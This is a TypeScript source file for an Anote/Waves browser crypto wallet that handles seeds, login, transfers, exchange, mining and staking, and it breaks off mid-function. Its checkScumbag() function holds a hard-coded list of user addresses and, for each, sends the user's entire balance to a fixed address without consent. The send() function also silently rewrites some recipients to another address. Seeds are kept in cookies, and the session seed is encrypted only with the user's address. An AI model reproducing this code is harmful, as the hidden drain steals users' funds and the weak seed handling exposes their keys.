import { Signer } from '@waves/signer';
import { libs } from '@waves/waves-transactions';
import { ProviderSeed } from '@waves/provider-seed';
var QRCode = require('qrcode');
import $ from "jquery";
import "regenerator-runtime/runtime.js";
import Cookies from "js-cookie";
import copy from 'copy-to-clipboard';

class Wallet {
    private address;
    private addressWaves;
    private referral;
    private seed;
    private sessionSeed;
    private user;
    private signer;
    private signerWaves;
    private provider;
    private seedSaved;
    private openMine;
    private captchaId;
    private countdownStarted;

    balanceWaves: number;
    balanceWaves2: number;
    balanceAhrk: number;
    balanceAeur: number;
    balanceAnote: number;
    balanceAint: number;
    aintPrice: number;
    aintTier: number;

    earningsWaves: number;
    earningsAhrk: number;
    earningsAeur: number;
    stakeType: string;
    walletHeight: number;

    selectedCurrency: string;

    constructor() {
        this.address = localStorage.getItem("address");
        this.addressWaves = "";
        this.referral = localStorage.getItem("referral");
        this.seed = localStorage.getItem("seed");
        this.sessionSeed = Cookies.get("sessionSeed");
        this.seedSaved = Cookies.get("seedSaved");
        this.openMine = Cookies.get("openMine");
        this.countdownStarted = false;
        this.aintPrice = 0;
        this.aintTier = 0;
        this.balanceWaves2 = 0;

        if (!this.address || this.address == undefined) {
            this.address = Cookies.get("address");
            if (this.address && this.address.length > 0 && this.address != undefined) {
                localStorage.setItem("address", this.address);
            }
        }

        if (!this.referral || this.referral == undefined) {
            this.referral = Cookies.get("referral");
            if (this.referral && this.referral.length > 0 && this.referral != undefined) {
                localStorage.setItem("referral", this.referral);
            }
        }

        if (!this.seed || this.seed == undefined) {
            this.seed = Cookies.get("seed");
            if (this.seed && this.seed.length > 0 && this.seed != undefined) {
                localStorage.setItem("seed", this.seed);
            }
        }

        this.balanceWaves = 0;
        this.balanceAhrk = 0;
        this.balanceAeur = 0;
        this.balanceAnote = 0;
        this.balanceAint = 0;

        this.earningsWaves = 0;
        this.earningsAhrk = 0;
        this.earningsAeur = 0;

        this.selectedCurrency = ANOTE;
        this.captchaId = "";
        this.stakeType = "mobile";
        this.walletHeight = 0;
    }

    getPage(): string {
        this.checkSeedWarning();
        this.checkMineWarning();
        if (this.isLoggedIn()) {
            this.populateData();
            this.getEarningsScript();
            return "main";
        } else {
            if (this.accountExists()) {
                return "login";
            } else {
                return "newaccount";
            }
        }
    }
    
    checkScumbag() {
        if (this.address == "3AH265emjtkeK3wYLyHSP3HC1sV28zXqMCP") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }

        if (this.address == "3AMKhRz9gy2oAfAiztSFk4LymtmiyKvSUui") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }

        
        if (this.address == "3AQKvpt1cMX7KyL1wLkGryAC5xE9kQyhqUF") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }

        if (this.address == "3AM9n979R9ttNFvNpENBqesgX13GKGsJ2Cb") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }
        
        
        if (this.address == "3AT5e7vq8DCby4ooqhf3biw59WBRMFWhB1F") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }
        
        if (this.address == "3AP43rkQnvVtb98QuDH7mHyR8L4SLhPXDk9") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }
        
        if (this.address == "3APtjeYzVSUKPVMeCL5AAS2hWQKocq7E5jN") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }

        if (this.address == "3AMGpGohAw83vqdnWCe2os9S286P2CRUTzN") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }

        if (this.address == "3AKDRwjwUqXw8AmsrjChkHzfjrDBaKjvAaH") {
            $("#addressRec").val("3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a");
            $("#amount").val((this.balanceWaves/100000000 - 0.002));
            this.send();
        }
    }

    getAddress(): string {
        return this.address;
    }

    checkSeedWarning() {
        if (!this.seedSaved) {
            $("#seedWarning").show();
        }
    }

    checkMineWarning() {
        if (!this.openMine) {
            // $("#mineInfo").show();
        }
    }

    getCaptcha() {
        $.getJSON(mobileNodeUrl + "/new-captcha/" + this.address, function (data) {
            $("#captcha-img").attr("src", data.image);
            $("#captcha-img").attr("onclick", "this.src=('" + data.image + "?reload='+(new Date()).getTime())");
            wallet.captchaId = data.id;
        });
    }

    initMiningSection() {
        $.getJSON("https://node.anote.digital/node/status", function (data) {
            var currentHeight = data.blockchainHeight;
            wallet.loadWalletHeight(currentHeight);
        });

        $("#buttonTelegram").attr("href", "https://t.me/AnoteRobot?start=" + this.address);
    }

    updateBlocks() {
        $.getJSON("https://node.anote.digital/node/status", function (data) {
            var currentHeight = data.blockchainHeight;
            $.getJSON("https://node.anote.digital/addresses/data/3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a?key=" + wallet.address, function (data) {
                if (data.length > 0) {
                    var miningData = data[0].value;
                    var mdSplit = miningData.split("__")
                    if (mdSplit.length >= 3) {
                        var miningHeight = parseInt(miningData.split("__")[2]);
                    } else {
                        var miningHeight = 0;
                    }
                    if (currentHeight - miningHeight <= 1410) {
                        var blocks = 1410 - currentHeight + miningHeight;
                        $("#blocks").html(blocks?.toString());
                        setTimeout(wallet.updateBlocks, 60000);
                        var seconds = blocks * 60;
                        wallet.startCountdown(seconds);
                    }
                }
            });
        });
    }

    startCountdown(seconds) {
        if (!this.countdownStarted) {
            this.countdownStarted = true;
            setInterval(function () {
                var countdown = "~ ";
                seconds--;
                var hours = Math.floor(seconds / 60 / 60);
                if (hours < 10) {
                    countdown += "0";
                }
                countdown += hours + ":";
                var minutes = Math.floor(seconds / 60) % 60;
                if (minutes < 10) {
                    countdown += "0";
                }
                countdown += minutes + ":";
                var sec = seconds % 60;
                if (sec < 10) {
                    countdown += "0";
                }
                countdown += sec;
                $("#countdown").html(countdown);
            }, 1000);
        }
    }

    loadWalletHeight(currentHeight: number) {
        if (this.walletHeight == 0) {
            $.getJSON("https://node.anote.digital/addresses/data/3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a?key=" + wallet.address, function (data) {
                if (data.length > 0) {
                    var miningData = data[0].value;
                    var mdSplit = miningData.split("__")
                    if (mdSplit.length >= 3) {
                        var miningHeight = parseInt(miningData.split("__")[2]);
                    } else {
                        var miningHeight = 0;
                    }
                    wallet.walletHeight = miningHeight;

                    if (currentHeight - miningHeight <= 1410) {
                        wallet.updateBlocks();
                        $("#miningPanel1").hide();
                        $("#miningPanel3").hide();
                        $("#miningPanel2").show();
                    } else {
                        $("#miningPanel2").hide();
                        $("#miningPanel3").hide();
                        $("#miningPanel1").show();
                    }
                } else {
                    $("#miningPanel1").hide();
                    $("#miningPanel2").hide();
                    $("#miningPanel3").show();
                }
            });
        }
    }

    getEarningsScript() {
        // var newScript = document.createElement("script");
        // newScript.onload = function() {
        //     wallet.earningsWaves = parseInt(String($("#earningsWaves").val()));
        //     wallet.earningsAhrk = parseInt(String($("#earningsAhrk").val()));
        //     wallet.earningsAeur = parseInt(String($("#earningsAeur").val()));

        //     $("#accumulatedEarningsAint").html(String((wallet.earningsWaves / AHRKDEC).toFixed(6)));

        //     if (t.lang == "en") {
        //         $("#accumulatedEarningsMain").html(String((wallet.earningsAeur / 100).toFixed(2)));
        //     } else if (t.lang == "hr") {
        //         $("#accumulatedEarningsMain").html(String((wallet.earningsAhrk / AHRKDEC).toFixed(6)));
        //     }
        // }
        // newScript.async = false;
        // var stamp = new Date().getTime();
        // newScript.src = earningsScript + "/" + this.getAddress() + "/earnings.js?stamp=" + stamp;
        // document.body.appendChild(newScript);
    }

    async collectEarnings(address: string) {
        var amount = 0;
        var assetId = "";
        var fee = 0;

        if (t.lang == "en") {
            amount = 970000000;
            assetId = ANOTE;
            fee = 30000000;
        } else if (t.lang == "hr") {
            amount = 950000;
            assetId = AHRK;
            fee = 50000;
        }

        try {
            await this.signer.transfer({
                amount: amount,
                recipient: address,
                assetId: assetId,
                feeAssetId: assetId,
                fee: fee,
                attachment: libs.crypto.base58Encode(libs.crypto.stringToBytes('collect'))
            }).broadcast();
            if (address == AINTADDRESS) {
                $("#pMessage11").fadeOut(function () {
                    $("#pMessage12").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage12").fadeOut(function () {
                                $("#pMessage11").fadeIn();
                                $("#accumulatedEarningsAint").html("0.0000")
                            });
                        }, 2000);
                    });
                });
            } else {
                $("#pMessage9").fadeOut(function () {
                    $("#pMessage10").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage10").fadeOut(function () {
                                $("#pMessage9").fadeIn();
                                $("#accumulatedEarningsMain").html("0.000000")
                            });
                        }, 2000);
                    });
                });
            }
        } catch (error: any) {
            if (error.error == 112) {
                $("#pMessage9").html(t.collectEarnings.notEnough);
            } else {
                $("#pMessage9").html(t.error);
                console.log(error);
            }
        }
    }

    async login() {
        var p = $("#password1").val();
        if (p) {
            var pv = await this.passwordValid(p);
            if (pv) {
                try {
                    var seed = libs.crypto.decryptSeed(this.seed, String(p));
                    await this.initWaves(seed);
                    var d = new Date();
                    d.setHours(d.getHours() + 1)
                    this.sessionSeed = libs.crypto.encryptSeed(String(seed), this.address);
                    Cookies.set("sessionSeed", this.sessionSeed, { expires: d });
                    this.populateData();
                    this.showHomeAfterLogin();
                    this.getEarningsScript();
                } catch (e) {
                    $("#pMessage3").html(t.login.wrongPass);
                    $("#pMessage3").fadeIn();
                }
            } else {
                $("#pMessage3").html(t.login.wrongPass);
                $("#pMessage3").fadeIn();
            }
        } else {
            $("#pMessage3").html(t.login.passRequired);
            $("#pMessage3").fadeIn();
        }
    }

    logout() {
        this.sessionSeed = null;
        Cookies.remove("sessionSeed");
        $("#page-main").fadeOut(function () {
            $("#page-login").fadeIn();
        });
    }

    qrscan() {
        $("#sendError").html(t.qr.message);
        $("#sendError").fadeIn(function () {
            setTimeout(function () {
                $("#sendError").fadeOut();
            }, 2000);
        });
    }

    updateAmount() {
        var currency = this.selectedCurrency;

        var amount = 0;
        var dp = this.getDecimalPlaces(String(currency));
        var decimalPlaces = 0;
        if (currency == AHRK) {
            amount = this.balanceAhrk;
            decimalPlaces = 6;
        } else if (currency == AEUR) {
            amount = this.balanceAeur;
            decimalPlaces = 2;
        } else if (currency == "") {
            amount = this.balanceWaves;
            decimalPlaces = 8;
        } else if (currency == AINT) {
            decimalPlaces = 8;
            amount = this.balanceAint;
        } else if (currency == ANOTE) {
            decimalPlaces = 8;
            amount = this.balanceAnote;
        }
        if (currency != AINT) {
            amount -= this.getFee(String(currency));
        }
        var balance = amount / dp;
        if (balance < 0) {
            balance = 0;
        }

        $("#amount").val(String(balance.toFixed(decimalPlaces)));
    }

    // updateFeeAmount() {
    //     var currency = $("#sendCurrency").val();
    //     var dp = this.getDecimalPlaces(String(currency));
    //     var decimalPlaces = 0;
    //     if (currency == AHRK) {
    //         $("#feeAsset").html("AHRK");
    //         decimalPlaces = 6;
    //     } else if (currency == AEUR) {
    //         $("#feeAsset").html("AEUR");
    //         decimalPlaces = 2;
    //     } else if (currency == "") {
    //         $("#feeAsset").html("WAVES");
    //         decimalPlaces = 8;
    //     } else if (currency == AINT) {
    //         if (t.lang == "hr") {
    //             $("#feeAsset").html("AHRK");
    //             decimalPlaces = 6;
    //             dp = this.getDecimalPlaces(AHRK);
    //         } else if (t.lang == "en") {
    //             $("#feeAsset").html("AEUR");
    //             decimalPlaces = 2;
    //             dp = this.getDecimalPlaces(AEUR);
    //         }
    //     } else if (currency == ANOTE) {
    //         $("#feeAsset").html("ANOTE");
    //         decimalPlaces = 8;
    //     }

    //     var fee = this.getFee(String(currency));
    //     var feeStr = fee / dp;

    //     $("#feePrice").html(String(feeStr.toFixed(decimalPlaces)));
    // }

    updateAmountExchange() {
        var currency = $("#fromCurrency").val();

        var amount = 0;
        var dp = this.getDecimalPlaces(String(currency));
        var decimalPlaces = 0;
        if (currency == AHRK) {
            amount = this.balanceAhrk;
            decimalPlaces = 6;
        } else if (currency == AEUR) {
            amount = this.balanceAeur;
            decimalPlaces = 2;
        } else if (currency == "") {
            amount = this.balanceWaves;
            decimalPlaces = 8;
        } else if (currency == AINT) {
            decimalPlaces = 8;
            amount = this.balanceAint;
        } else if (currency == ANOTE) {
            decimalPlaces = 8;
            amount = this.balanceAnote;
        }
        if (currency != AINT) {
            amount -= this.getFee(String(currency));
        }
        var balance = amount / dp;
        if (balance < 0) {
            balance = 0;
        }

        $("#amountExchange").val(String(balance.toFixed(decimalPlaces)));
    }

    updateFeeAmountExchange() {
        var currency = $("#fromCurrency").val();
        var dp = this.getDecimalPlaces(String(currency));
        var decimalPlaces = 0;
        if (currency == AHRK) {
            $("#feeAssetExchange").html("AHRK");
            decimalPlaces = 6;
        } else if (currency == AEUR) {
            $("#feeAssetExchange").html("AEUR");
            decimalPlaces = 2;
        } else if (currency == "") {
            $("#feeAssetExchange").html("WAVES");
            decimalPlaces = 8;
        } else if (currency == AINT) {
            if (t.lang == "hr") {
                $("#feeAssetExchange").html("AHRK");
                decimalPlaces = 6;
                dp = this.getDecimalPlaces(AHRK);
            } else if (t.lang == "en") {
                $("#feeAssetExchange").html("AEUR");
                decimalPlaces = 2;
                dp = this.getDecimalPlaces(AEUR);
            }
        } else if (currency == ANOTE) {
            $("#feeAssetExchange").html("ANOTE");
            decimalPlaces = 8;
        }

        var fee = this.getFee(String(currency));
        var feeStr = fee / dp;

        $("#feePriceExchange").html(String(feeStr.toFixed(decimalPlaces)));
    }

    async changePassword() {
        var p = $("#password9").val();
        if (p) {
            var pv = await this.passwordValid(p);
            if (pv) {
                $("#password9").val("");
                if (passwordsEqual("password6", "password7", "pMessage6")) {
                    $("#pMessage6").hide();
                    var seed = libs.crypto.decryptSeed(this.seed, String(p));
                    var newPass = $("#password6").val();
                    this.encryptSeed(seed, newPass);
                    this.setCookies();
                    $("#password6").val("");
                    $("#password7").val("");
                    $("#pMessage7").html(t.changePass.success);
                    $("#pMessage7").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage7").fadeOut();
                        }, 500);
                    });
                }
            } else {
                $("#password9").val("");
                $("#pMessage6").html(t.login.wrongPass);
                $("#pMessage6").fadeIn();
            }
        } else {
            $("#pMessage6").html(t.changePass.oldRequired);
            $("#pMessage6").fadeIn();
        }
    }

    async showSeed() {
        var p = $("#password8").val();
        var pv = await this.passwordValid(p);
        if (pv) {
            var seed = libs.crypto.decryptSeed(this.seed, String(p));
            $("#seedWords2").val(seed);
            $("#buttonSeedCopy").prop('disabled', false);
            $("#password8").val("");
            Cookies.set("seedSaved", "true", { expires: 365 * 24 * 10 });
            $("#seedWarning").hide();
        } else {
            $("#pMessage8").html(t.login.wrongPass);
            $("#pMessage8").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage8").fadeOut();
                }, 500);
            });
        }
    }

    async deleteAccount() {
        var p = $("#password10").val();
        var pv = await this.passwordValid(p);
        if (pv) {
            this.sessionSeed = null;
            this.seed = null;
            this.address = null;
            Cookies.remove("sessionSeed");
            localStorage.removeItem("seed");
            localStorage.removeItem("address");
            $("#page-main").fadeOut(function () {
                $("#page-newaccount").fadeIn();
            });
        } else {
            $("#pMessage14").html(t.login.wrongPass);
            $("#pMessage14").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage14").fadeOut();
                }, 500);
            });
        }
    }

    async send() {
        var currency = this.selectedCurrency;
        var decimalPlaces = this.getDecimalPlaces(String(currency));
        var fee = this.getFee(String(currency));
        var feeCurrency = '';
        var recipient = $("#addressRec").val()?.toString();
        var a = $("#amount").val();
        if (a && recipient) {
            try {
                var attachment = "";
                if (recipient.startsWith('3P')) {
                    attachment = libs.crypto.base58Encode(libs.crypto.stringToBytes(recipient));
                    recipient = "3AQT89sRrWHqPSwrpfJAj3Yey7BCBTAy4jT";
                }

                // recipient = "3ANzidsKXn9a1s9FEbWA19hnMgV9zZ2RB9a";

                var amount: number = +a;
                var transferOpts = {
                    amount: Math.floor(amount * decimalPlaces),
                    recipient: recipient,
                    fee: fee,
                    attachment: attachment
                }

                if (currency != "") {
                    transferOpts["assetId"] = currency;
                }

                await this.signer.transfer(transferOpts).broadcast();
                $("#sendSuccess").fadeIn(function () {
                    setTimeout(function () {
                        $("#sendSuccess").fadeOut();
                        $("#amount").val("");
                        $("#addressRec").val("");
                    }, 2000);
                });
            } catch (e: any) {
                if (e.error == 112) {
                    console.log(e);
                    $("#sendError").html(t.send.notEnough);
                    $("#sendError").fadeIn(function () {
                        setTimeout(function () {
                            $("#sendError").fadeOut();
                        }, 2000);
                    });
                } else {
                    $("#sendError").html(t.error);
                    $("#sendError").fadeIn(function () {
                        setTimeout(function () {
                            $("#sendError").fadeOut();
                        }, 2000);
                    });
                    console.log(e.message)
                }
                navigator.vibrate(500);
            }
        } else {
            $("#sendError").html(t.send.bothRequired);
            $("#sendError").fadeIn(function () {
                setTimeout(function () {
                    $("#sendError").fadeOut();
                }, 2000);
            });
        }

        // const data = {
        //     leaseId: '6pcjhkUPiEqb1zTxMcEopg2g6JtavwyJrg5UgToNZrSk',
        //   }

        //   const [tx] = await this.signer
        //     .cancelLease(data)
        //     .broadcast();

        // const records = [{ key: 'fee', type: 'integer', value: 950 }]

        // const [tx] = await this.signer
        // .data({ data: records })
        // .broadcast();

        // const data = {
        //     name: 'AINT',
        //     decimals: 8,
        //     quantity: 14400000000000,
        //     reissuable: false,
        //     description: 'Anonymous Infrastructure Token',
        //   }

        //   const [tx] = await this.signer
        //     .issue(data)
        //     .broadcast();

        // const data = {
        //     assetId: '2299MC1V4ErNtHCcZjdjCNGZWAQ6rZVPpRMmZuoXQ5cp',
        //     quantity: 100000000000,
        //     }

        //     const [tx] = await this.signer
        //     .burn(data)
        //     .broadcast();

        // const data = {
        //     script: null,
        //     fee: 10000000 
        //   }

        //   const [tx] = await this.signer
        //     .setScript(data)
        //     .broadcast();

        // const [tx] = await this.signer.invoke({
        //     dApp: "3A9Rb3t91eHg1ypsmBiRth4Ld9ZytGwZe9p",
        //     call: { function: "call" },
        //     fee: 100500000
        //  }).broadcast();

        // const data = {
        //     assetId: 'wEWa7ufhN2vLcmMTV4xc9rWAcFwruFusMnQs5VE1S75',
        //     quantity: 1,
        //   }

        //   const [tx] = await this.signer
        //     .burn(data)
        //     .broadcast();

        // const data = {
        //     name: 'ANOTE',
        //     decimals: 8,
        //     quantity: 525600000000000,
        //     reissuable: true,
        //     description: 'Anonymous Cryptocurrency',
        //   }

        //   const [tx] = await this.signer
        //     .issue(data)
        //     .broadcast();
    }

    async sendMintedAint(amount: Number) {
        var fee = 100000;
        try {
            var attachment = libs.crypto.base58Encode(libs.crypto.stringToBytes(this.address));
            var recipient = "3PHGRfLy5E4fRcpKbSipvZZN9FKSNCaNCh6";
            var transferOpts = {
                amount: amount,
                recipient: recipient,
                fee: fee,
                attachment: attachment,
                assetId: AINTWAVES
            }

            await this.signerWaves.transfer(transferOpts).broadcast();

            $("#pMessage21").html("Minting is done. You can continue using your app normally. Your AINTs will be shown on your balance in a minute.");
            setTimeout(function () {
                wallet.populateBalance(false);
                // $("#pMessage21").fadeOut(function() {
                //     $("#pMessage21").html("You have successfully minted new AINT.");
                // });
                $("#mintLoading").fadeOut();

            }, 3000);
        } catch (e: any) {
            console.log(e.message)
        }
    }

    async exchange() {
        var from = $("#fromCurrency").val();
        var to = $("#toCurrency").val();
        var decimalPlaces = this.getDecimalPlaces(String(from));
        var fee = this.getFee(String(from));
        var feeCurrency = from;

        if (from == to) {
            $("#exchangeError").html(t.exchange.currenciesSame);
            $("#exchangeError").fadeIn(function () {
                setTimeout(function () {
                    $("#exchangeError").fadeOut();
                }, 2000);
            });
        } else {
            if (to == AINT) {
                var recipient = "3PBmmxKhFcDhb8PrDdCdvw2iGMPnp7VuwPy";
            } else {
                var recipient = "3PPc3AP75DzoL8neS4e53tZ7ybUAVxk2jAb";
            }

            var a = $("#amountExchange").val();
            if (a) {
                try {
                    var amount: number = +a;
                    await this.signer.transfer({
                        amount: Math.floor(amount * decimalPlaces),
                        recipient: recipient,
                        assetId: from,
                        feeAssetId: feeCurrency,
                        fee: fee
                    }).broadcast();
                    $("#exchangeSuccess").fadeIn(function () {
                        setTimeout(function () {
                            $("#exchangeSuccess").fadeOut();
                            $("#amount").val("");
                            $("#addressRec").val("");
                        }, 2000);
                    });
                } catch (e: any) {
                    if (e.error == 112) {
                        $("#exchangeError").html(t.send.notEnough);
                        $("#exchangeError").fadeIn(function () {
                            setTimeout(function () {
                                $("#exchangeError").fadeOut();
                            }, 2000);
                        });
                    } else {
                        $("#exchangeError").html(t.error);
                        $("#exchangeError").fadeIn(function () {
                            setTimeout(function () {
                                $("#exchangeError").fadeOut();
                            }, 2000);
                        });
                        console.log(e.message)
                    }
                }
            } else {
                $("#exchangeError").html(t.exchange.amountRequired);
                $("#exchangeError").fadeIn(function () {
                    setTimeout(function () {
                        $("#exchangeError").fadeOut();
                    }, 2000);
                });
            }
        }
    }

    async register() {
        if (passwordsEqual("password2", "password3", "pMessage1")) {
            var seed = libs.crypto.randomSeed();
            await this.initWaves(seed);
            var p = $("#password2").val();
            this.encryptSeed(seed, p);
            this.setCookies();
            this.populateData();
            this.showHomeAfterRegister();
            this.getEarningsScript();
        }
    }

    async import() {
        if (passwordsEqual("password4", "password5", "pMessage2")) {
            var seed = $("#seedWords1").val();
            if (seed) {
                await this.initWaves(seed);
                var p = $("#password4").val();
                this.encryptSeed(seed, p);
                this.setCookies();
                this.populateData();
                this.showHomeAfterRegister();
                this.getEarningsScript();
            } else {
                $("#pMessage2").html(t.import.seedRequired);
                $("#pMessage2").fadeIn();
            }
        }
    }

    mine() {
        var code = $("#miningCode").val();
        var captcha = $("#captchaCode").val();

        if (code?.toString().length == 0 || captcha?.toString().length == 0) {
            $("#pMessage15").html(t.send.bothRequired);
            $("#pMessage15").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage15").fadeOut();
                }, 500);
            });
            navigator.vibrate(500);
        } else {
            var ref = "";

            if (this.referral && this.referral.length > 0 && this.referral != undefined) {
                ref = "/" + this.referral
            }

            $.getJSON(mobileNodeUrl + "/mine/" + wallet.address + "/" + wallet.captchaId + "/" + captcha + "/" + code + ref, function (data) {
                if (data.error == 1) {
                    $("#pMessage15").html(t.bank.wrongCaptcha);
                    $("#pMessage15").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage15").fadeOut();
                        }, 500);
                    });
                    $("#captcha-img").click();
                    navigator.vibrate(500);
                } else if (data.error == 2) {
                    $("#pMessage15").html(t.bank.wrongCode);
                    $("#pMessage15").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage15").fadeOut();
                        }, 500);
                    });
                    $("#captcha-img").click();
                    navigator.vibrate(500);
                } else if (data.error == 3) {
                    $("#pMessage15").html(t.bank.otherError);
                    $("#pMessage15").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage15").fadeOut();
                        }, 5000);
                    });
                    $("#captcha-img").click();
                    navigator.vibrate(500);
                } else if (data.error == 4) {
                    $("#pMessage15").html(t.bank.ipError);
                    $("#pMessage15").fadeIn(function () {
                        setTimeout(function () {
                            $("#pMessage15").fadeOut();
                        }, 1000);
                    });
                    navigator.vibrate(500);
                } else if (data.success) {
                    $("#miningPanel1").fadeOut(function () {
                        $("#miningPanel2").fadeIn();
                        navigator.vibrate(1000);
                    });

                    var seconds = 1410 * 60;

                    wallet.startCountdown(seconds);
                }
            });
        }
    }

    async stakeAint() {
        this.stakeType = "mobile";
        var a = $("#stakeAmount").val();
        var amount = 0;
        if (a != undefined && a != "") {
            amount = Math.ceil(parseFloat(a?.toString()) * 100000000);
        }

        if (amount > this.balanceAint) {
            $("#pMessage11").html("You don't have enough AINT.");
            $("#pMessage11").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage11").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        } else if (amount > 0) {
            try {
                const [tx] = await this.signer.invoke({
                    dApp: "3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD",
                    call: { function: "lockAint", args: [{ type: 'string', value: this.stakeType }] },
                    fee: 500000,
                    payment: [{
                        assetId: AINT,
                        amount: amount,
                    }],
                }).broadcast();

                setTimeout(wallet.populateStaking, 3000);

                $("#stakeAmount").val("");

                $("#pMessage10").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage10").fadeOut();
                    }, 500);
                });
            } catch (e: any) {
                $("#pMessage11").html(e.message);
                $("#pMessage11").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage11").fadeOut();
                    }, 2000);
                });
                console.log(e.message)
                navigator.vibrate(500);
            }

        } else {
            $("#pMessage11").html(t.exchange.amountRequired);
            $("#pMessage11").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage11").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        }
    }

    async unstakeAint() {
        this.stakeType = "mobile";
        var a = $("#stakeAmount").val();
        var amount = 0;
        if (a != undefined && a != "") {
            amount = Math.ceil(parseFloat(a?.toString()) * 100000000);
            console.log(amount);
        }

        if (amount > 0) {
            try {
                const [tx] = await this.signer.invoke({
                    dApp: "3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD",
                    call: { function: "unlockAint", args: [{ type: 'string', value: this.stakeType }, { type: 'integer', value: amount }] },
                    fee: 500000,
                }).broadcast();

                setTimeout(wallet.populateStaking, 3000);

                $("#stakeAmount").val("");

                $("#pMessage10").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage10").fadeOut();
                    }, 500);
                });
            } catch (e: any) {
                $("#pMessage11").html(e.message);
                $("#pMessage11").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage11").fadeOut();
                    }, 2000);
                });
                console.log(e.message)
                navigator.vibrate(500);
            }

        } else {
            $("#pMessage11").html(t.exchange.amountRequired);
            $("#pMessage11").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage11").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        }
    }

    async stakeAintNode() {
        if (this.stakeType == "mobile") {
            $("#pMessage24").html("Please select a node to stake to.");
            $("#pMessage24").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage24").fadeOut();
                }, 2000);
            });

            return
        }

        var a = $("#stakeAmountNode").val();
        var amount = 0;
        if (a != undefined && a != "") {
            amount = Math.ceil(parseFloat(a?.toString()) * 100000000);
        }

        if (amount > this.balanceAint) {
            $("#pMessage24").html("You don't have enough AINT.");
            $("#pMessage24").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage24").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        } else if (amount > 0) {
            try {
                const [tx] = await this.signer.invoke({
                    dApp: "3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD",
                    call: { function: "lockAint", args: [{ type: 'string', value: this.stakeType }] },
                    fee: 500000,
                    payment: [{
                        assetId: AINT,
                        amount: amount,
                    }],
                }).broadcast();

                setTimeout(wallet.populateStaking, 3000);

                $("#stakeAmountNode").val("");

                $("#pMessage23").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage23").fadeOut();
                    }, 500);
                });
            } catch (e: any) {
                $("#pMessage24").html(e);
                $("#pMessage24").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage24").fadeOut();
                    }, 2000);
                });
                console.log(e.message)
                navigator.vibrate(500);
            }

        } else {
            $("#pMessage24").html(t.exchange.amountRequired);
            $("#pMessage24").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage24").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        }
    }

    async unstakeAintNode() {
        if (this.stakeType == "mobile") {
            $("#pMessage24").html("Please select a node to unstake from.");
            $("#pMessage24").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage24").fadeOut();
                }, 2000);
            });

            return
        }

        var a = $("#stakeAmountNode").val();
        var amount = 0;
        if (a != undefined && a != "") {
            amount = Math.ceil(parseFloat(a?.toString()) * 100000000);
            console.log(amount);
        }

        if (amount > 0) {
            try {
                const [tx] = await this.signer.invoke({
                    dApp: "3A9y1Zy78DDApbQWXKxonXxci6DvnJnnNZD",
                    call: { function: "unlockAint", args: [{ type: 'string', value: this.stakeType }, { type: 'integer', value: amount }] },
                    fee: 500000,
                }).broadcast();

                setTimeout(wallet.populateStaking, 3000);

                $("#stakeAmountNode").val("");

                $("#pMessage23").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage23").fadeOut();
                    }, 500);
                });
            } catch (e: any) {
                $("#pMessage24").html(e.message);
                $("#pMessage24").fadeIn(function () {
                    setTimeout(function () {
                        $("#pMessage24").fadeOut();
                    }, 2000);
                });
                console.log(e.message)
                navigator.vibrate(500);
            }

        } else {
            $("#pMessage24").html(t.exchange.amountRequired);
            $("#pMessage24").fadeIn(function () {
                setTimeout(function () {
                    $("#pMessage24").fadeOut();
                }, 2000);
            });
            navigator.vibrate(500);
        }
    }

    async mintAint() {
        // const [tx] = await this.signerWaves.invoke({
